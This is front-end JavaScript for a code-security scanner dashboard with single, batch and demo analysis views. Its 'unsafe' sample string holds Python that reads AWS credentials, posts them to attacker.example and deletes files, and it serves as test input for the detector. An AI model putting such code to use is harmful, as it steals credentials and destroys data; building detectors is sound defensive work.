document.addEventListener('DOMContentLoaded', () => {
    // ── Tab Management ──────────────────────────────────────────────────────
    const tabs = document.querySelectorAll('.tab-btn');
    const contents = document.querySelectorAll('.tab-content');

    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            tabs.forEach(t => t.classList.remove('active'));
            contents.forEach(c => c.classList.remove('active'));
            tab.classList.add('active');
            document.getElementById(`${tab.dataset.tab}-tab`).classList.add('active');
        });
    });

    // ── Editor Line Numbers ─────────────────────────────────────────────────
    const codeInput = document.getElementById('code-input');
    const lineNumbers = document.getElementById('line-numbers');

    const updateLineNumbers = () => {
        const lines = codeInput.value.split('\n').length;
        lineNumbers.innerHTML = Array.from({ length: lines }, (_, i) => i + 1).join('<br>');
    };

    codeInput.addEventListener('input', updateLineNumbers);
    updateLineNumbers();

    // ── Health Check ────────────────────────────────────────────────────────
    const healthDot = document.querySelector('.dot');
    const healthText = document.querySelector('.status-text');
    const aboutVersion = document.getElementById('about-version');

    const checkHealth = async () => {
        try {
            const res = await fetch('/health');
            const data = await res.json();
            const modelsLoaded = data.models_loaded !== undefined ? data.models_loaded : data.model_ready;
            if (data.status === 'ok') {
                healthDot.className = 'dot online';
                healthText.textContent = modelsLoaded ? 'Online (ML Ready)' : 'Online (Rules Only)';
            } else {
                healthDot.className = 'dot offline';
                healthText.textContent = 'Degraded';
            }
            if (aboutVersion && data.version) aboutVersion.textContent = data.version;
        } catch (e) {
            healthDot.className = 'dot offline';
            healthText.textContent = 'Offline';
        }
    };

    setInterval(checkHealth, 10000);
    checkHealth();

    // ── Analysis Logic ──────────────────────────────────────────────────────
    const analyzeBtn = document.getElementById('analyze-btn');
    const deepToggle = document.getElementById('deep-toggle');
    const resultPanel = document.getElementById('result-panel');
    const verdictBadge = document.getElementById('verdict-badge');
    const riskValue = document.getElementById('risk-value');
    const riskBar = document.getElementById('risk-bar');
    const latencyValue = document.getElementById('latency-value');
    const categoryChips = document.getElementById('category-chips');
    const reasonText = document.getElementById('reason-text');
    const codeViewer = document.getElementById('code-viewer');
    const diagContainer = document.getElementById('diagnostics-container');
    const diagBody = document.getElementById('diagnostics-body');

    const performAnalysis = async () => {
        const code = codeInput.value;
        if (!code.trim()) return;

        const deep = deepToggle && deepToggle.checked;
        const endpoint = deep ? '/analyze' : '/check';

        analyzeBtn.disabled = true;
        analyzeBtn.textContent = 'Analyzing...';

        const t0 = performance.now();
        try {
            const res = await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code })
            });
            const data = await res.json();
            const latency = Math.round(performance.now() - t0);
            renderResult(data, latency, code, deep);
        } catch (e) {
            console.error(e);
            showUnexpected('Request failed — could not reach the server.');
        } finally {
            analyzeBtn.disabled = false;
            analyzeBtn.textContent = 'Analyze';
        }
    };

    const showUnexpected = (msg) => {
        resultPanel.classList.remove('hidden');
        verdictBadge.textContent = 'N/A';
        verdictBadge.className = 'badge';
        reasonText.textContent = msg;
        categoryChips.innerHTML = '';
        codeViewer.innerHTML = '';
        riskBar.style.width = '0%';
        riskValue.textContent = '—';
        latencyValue.textContent = '0';
        diagContainer.classList.add('hidden');
    };

    const renderResult = (data, latency, originalCode, deep) => {
        resultPanel.classList.remove('hidden');

        if (!data || typeof data.verdict !== 'string') {
            showUnexpected('Unexpected response from server.');
            return;
        }

        // Verdict (icon + text, not colour alone)
        const isBlock = data.verdict === 'block';
        verdictBadge.textContent = isBlock ? '\u2715 BLOCK' : '\u2713 ALLOW';
        verdictBadge.className = `badge ${data.verdict}`;

        // Risk
        const risk = typeof data.risk_score === 'number' ? data.risk_score : 0;
        riskValue.textContent = risk.toFixed(4);
        riskBar.style.width = `${risk * 100}%`;

        // Latency
        latencyValue.textContent = latency;

        // Categories
        categoryChips.innerHTML = '';
        (data.categories || []).forEach(cat => {
            const span = document.createElement('span');
            span.className = 'chip';
            span.textContent = cat;
            categoryChips.appendChild(span);
        });

        // Reason
        reasonText.textContent = data.reason || '';

        // Code Viewer with highlights — build DOM nodes, never innerHTML with code
        const lines = originalCode.split('\n');
        const vulnLines = new Set(data.vulnerable_lines || []);
        codeViewer.innerHTML = '';
        lines.forEach((line, i) => {
            const lineNum = i + 1;
            const lineDiv = document.createElement('div');
            if (vulnLines.has(lineNum)) lineDiv.className = 'vulnerable-line';
            const numSpan = document.createElement('span');
            numSpan.className = 'ln';
            numSpan.textContent = String(lineNum);
            lineDiv.appendChild(numSpan);
            lineDiv.appendChild(document.createTextNode(' ' + line));
            codeViewer.appendChild(lineDiv);
        });

        // Diagnostics (only for /analyze)
        if (deep && data.category_scores) {
            renderDiagnostics(data);
        } else {
            diagContainer.classList.add('hidden');
        }

        if (window.innerWidth < 900) {
            resultPanel.scrollIntoView({ behavior: 'smooth' });
        }
    };

    const renderDiagnostics = (data) => {
        diagContainer.classList.remove('hidden');
        diagBody.innerHTML = '';

        const addRow = (label, value) => {
            const p = document.createElement('p');
            const b = document.createElement('strong');
            b.textContent = label + ': ';
            p.appendChild(b);
            p.appendChild(document.createTextNode(value));
            diagBody.appendChild(p);
        };

        addRow('Deobfuscation layers', String(data.deobfuscation_layers ?? 0));
        addRow('ML ran', String(data.ml_ran));

        const timings = data.timings_ms || {};
        addRow('Timings (ms)', Object.entries(timings).map(([k, v]) => `${k}=${v}`).join(', ') || '—');

        const scores = data.category_scores || {};
        const scoreStr = Object.entries(scores)
            .filter(([, v]) => v > 0.01)
            .sort((a, b) => b[1] - a[1])
            .map(([k, v]) => `${k}=${v}`)
            .join(', ');
        addRow('Category scores', scoreStr || '—');

        const ml = data.ml_probs || {};
        const mlStr = Object.entries(ml)
            .filter(([, v]) => v > 0.01)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5)
            .map(([k, v]) => `${k}=${v}`)
            .join(', ');
        addRow('ML probs (top)', mlStr || '—');

        const ev = data.evidence || [];
        if (ev.length) {
            const list = document.createElement('div');
            list.className = 'evidence-list';
            ev.slice(0, 15).forEach(e => {
                const row = document.createElement('div');
                row.className = 'evidence-row';
                row.textContent = `[L${e.line}] ${e.category} (${e.confidence}) — ${e.description}`;
                list.appendChild(row);
            });
            diagBody.appendChild(list);
        }
    };

    analyzeBtn.addEventListener('click', performAnalysis);

    // Ctrl/Cmd + Enter triggers Analyze
    codeInput.addEventListener('keydown', (e) => {
        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
            e.preventDefault();
            performAnalysis();
        }
    });

    // ── Samples ─────────────────────────────────────────────────────────────
    const safeSample = `import os
def load_config():
    # Read non-sensitive config
    path = os.path.expanduser("~/.config/myapp/settings.json")
    if os.path.exists(path):
        with open(path) as f:
            return f.read()
    return "{}"`;

    const unsafeSample = `import os, requests
# Steal AWS credentials
with open(os.path.expanduser("~/.aws/credentials")) as f:
    creds = f.read()
requests.post("http://attacker.example/collect", data=creds)
# Cleanup
os.system("rm -rf /tmp/stolen_data")`;

    document.getElementById('load-safe-btn').addEventListener('click', () => {
        codeInput.value = safeSample;
        updateLineNumbers();
    });

    document.getElementById('load-unsafe-btn').addEventListener('click', () => {
        codeInput.value = unsafeSample;
        updateLineNumbers();
    });

    document.getElementById('clear-btn').addEventListener('click', () => {
        codeInput.value = '';
        updateLineNumbers();
        resultPanel.classList.add('hidden');
    });

    // ── Batch Logic ─────────────────────────────────────────────────────────
    const batchBtn = document.getElementById('run-batch-btn');
    const batchInput = document.getElementById('batch-input');
    const batchTableBody = document.querySelector('#batch-table tbody');
    const batchFile = document.getElementById('batch-file');
    const uploadBtn = document.getElementById('upload-btn');
    const downloadBtn = document.getElementById('download-batch-btn');
    const batchSummary = document.getElementById('batch-summary');
    let lastBatchResults = [];

    const looksLikeCsv = (text) => {
        const t = (text || '').trim();
        if (!t) return false;
        const first = t.split('\n')[0].trim();
        if (first.startsWith('[') || first.startsWith('{')) return false;
        return t.split('\n')[0].includes(',');
    };

    const parseBatchInput = (text) => {
        try {
            const parsed = JSON.parse(text);
            if (Array.isArray(parsed)) return parsed;
        } catch (e) { /* fall through */ }
        return text.split('\n').filter(l => l.trim()).map((l, i) => ({ id: i + 1, code: l }));
    };

    const renderBatchRows = (results) => {
        batchTableBody.innerHTML = '';
        results.forEach(r => {
            const tr = document.createElement('tr');
            const gold = (r.gold_malicious === undefined || r.gold_malicious === null)
                ? '—' : (r.gold_malicious ? 'mal' : 'benign');
            const correct = (r.correct === undefined || r.correct === null) ? '' : (r.correct ? ' ✓' : ' ✗');
            const cells = [
                String(r.id ?? '-'),
                r.verdict, // handled specially (badge)
                typeof r.risk_score === 'number' ? r.risk_score.toFixed(3) : '—',
                (r.categories || []).join(', ') || '-',
                r.code_language || '—',
                gold + correct,
            ];
            cells.forEach((val, idx) => {
                const td = document.createElement('td');
                if (idx === 1) {
                    const span = document.createElement('span');
                    span.className = `badge ${r.verdict}`;
                    span.style.fontSize = '0.75rem';
                    span.textContent = r.verdict ? r.verdict.toUpperCase() : '?';
                    td.appendChild(span);
                } else {
                    td.textContent = val;
                }
                tr.appendChild(td);
            });
            batchTableBody.appendChild(tr);
        });
    };

    const renderBatchSummary = (summary) => {
        batchSummary.innerHTML = '';
        if (!summary || !summary.total) {
            batchSummary.classList.add('hidden');
            return;
        }
        batchSummary.classList.remove('hidden');
        const add = (label, value) => {
            const span = document.createElement('span');
            span.className = 'summary-item';
            const b = document.createElement('strong');
            b.textContent = label + ': ';
            span.appendChild(b);
            span.appendChild(document.createTextNode(value));
            batchSummary.appendChild(span);
        };
        add('Total', summary.total);
        add('Blocked', summary.blocked);
        add('Allowed', summary.allowed);
        if (summary.labeled && summary.verdict) {
            const v = summary.verdict;
            add('Precision', v.precision.toFixed(4));
            add('Recall', v.recall.toFixed(4));
            add('F1', v.f1.toFixed(4));
            add('FPR', v.fpr.toFixed(4));
            add('Accuracy', v.accuracy.toFixed(4));
        }
    };

    const downloadBatch = () => {
        if (!lastBatchResults.length) return;
        const header = ['id', 'verdict', 'risk_score', 'categories', 'code_language',
                        'reason', 'vulnerable_lines', 'gold_malicious', 'gold_categories', 'correct'];
        const esc = (v) => {
            const s = String(v === undefined || v === null ? '' : v);
            return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
        };
        const lines = [header.join(',')];
        lastBatchResults.forEach(r => {
            lines.push([
                esc(r.id), esc(r.verdict), esc(r.risk_score),
                esc((r.categories || []).join(';')), esc(r.code_language), esc(r.reason),
                esc((r.vulnerable_lines || []).join(';')),
                esc(r.gold_malicious === null || r.gold_malicious === undefined ? '' : (r.gold_malicious ? 1 : 0)),
                esc((r.gold_categories || []).join(';')),
                esc(r.correct === null || r.correct === undefined ? '' : (r.correct ? 1 : 0)),
            ].join(','));
        });
        const blob = new Blob([lines.join('\n')], { type: 'text/csv' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'codeguard_results.csv';
        document.body.appendChild(a);
        a.click();
        a.remove();
        URL.revokeObjectURL(a.href);
    };

    const finishBatch = (results, summary) => {
        lastBatchResults = results || [];
        renderBatchRows(lastBatchResults);
        renderBatchSummary(summary);
        downloadBtn.disabled = lastBatchResults.length === 0;
    };

    const runBatchCsv = async (csvText) => {
        batchBtn.disabled = true;
        batchBtn.textContent = 'Running...';
        batchTableBody.innerHTML = '';
        batchSummary.classList.add('hidden');
        try {
            const res = await fetch('/batch/csv', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ csv: csvText })
            });
            const data = await res.json();
            finishBatch(data.results || [], data.summary);
        } catch (e) {
            console.error(e);
            alert('Batch (CSV) failed.');
        } finally {
            batchBtn.disabled = false;
            batchBtn.textContent = 'Run Batch';
        }
    };

    const runBatch = async (items) => {
        batchBtn.disabled = true;
        batchBtn.textContent = 'Running...';
        batchTableBody.innerHTML = '';
        batchSummary.classList.add('hidden');
        try {
            const res = await fetch('/batch', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ snippets: items })
            });
            const data = await res.json();
            finishBatch(data.results || [], { total: (data.results || []).length,
                blocked: (data.results || []).filter(r => r.verdict === 'block').length,
                allowed: (data.results || []).filter(r => r.verdict === 'allow').length });
        } catch (e) {
            console.error(e);
            alert('Batch failed.');
        } finally {
            batchBtn.disabled = false;
            batchBtn.textContent = 'Run Batch';
        }
    };

    batchBtn.addEventListener('click', () => {
        const text = batchInput.value;
        if (looksLikeCsv(text)) runBatchCsv(text);
        else runBatch(parseBatchInput(text));
    });

    downloadBtn.addEventListener('click', downloadBatch);

    uploadBtn.addEventListener('click', () => batchFile.click());

    batchFile.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = () => {
            const text = reader.result;
            batchInput.value = text;
            const isCsv = /\.csv$/i.test(file.name) || looksLikeCsv(text);
            if (isCsv) {
                runBatchCsv(text);
            } else {
                const lines = text.split('\n').filter(l => l.trim());
                const items = lines.map((l, i) => {
                    try {
                        const obj = JSON.parse(l);
                        return { id: obj.id ?? i + 1, code: obj.code ?? '' };
                    } catch (err) {
                        return { id: i + 1, code: l };
                    }
                });
                runBatch(items);
            }
        };
        reader.readAsText(file);
    });

    // ── Interception Logic ──────────────────────────────────────────────────
    const interceptBtn = document.getElementById('run-intercept-btn');
    const interceptResults = document.getElementById('intercept-results');
    const interceptBanner = document.getElementById('intercept-banner');
    const interceptDetails = document.getElementById('intercept-details');

    interceptBtn.addEventListener('click', async () => {
        interceptBtn.disabled = true;
        interceptBtn.textContent = 'Running Proof...';
        try {
            const res = await fetch('/demo/intercept', { method: 'POST' });
            const data = await res.json();
            renderIntercept(data);
        } catch (e) {
            interceptResults.classList.remove('hidden');
            interceptBanner.textContent = 'ERROR';
            interceptBanner.className = 'banner fail';
            interceptDetails.textContent = 'Could not reach /demo/intercept.';
        } finally {
            interceptBtn.disabled = false;
            interceptBtn.textContent = 'Run Interception Proof';
        }
    });

    const renderIntercept = (data) => {
        interceptResults.classList.remove('hidden');
        const pass = !!data.passed;
        interceptBanner.textContent = pass ? '\u2713 PASS' : '\u2715 FAIL';
        interceptBanner.className = `banner ${pass ? 'pass' : 'fail'}`;
        interceptDetails.innerHTML = '';
        (data.evidence || []).forEach(e => {
            const p = document.createElement('p');
            p.textContent = '\u2022 ' + e;
            interceptDetails.appendChild(p);
        });
    };
});
